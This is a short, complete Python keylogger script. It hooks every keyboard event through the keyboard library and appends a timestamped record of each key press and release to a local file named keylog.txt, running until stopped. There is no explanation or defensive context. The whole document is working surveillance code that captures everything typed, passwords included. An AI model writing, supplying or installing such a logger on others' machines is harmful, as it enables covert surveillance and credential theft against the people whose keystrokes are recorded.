import keyboard, datetime

def log(e):
    with open("keylog.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} {e.event_type}: {e.name}\n")

keyboard.hook(log)
keyboard.wait()
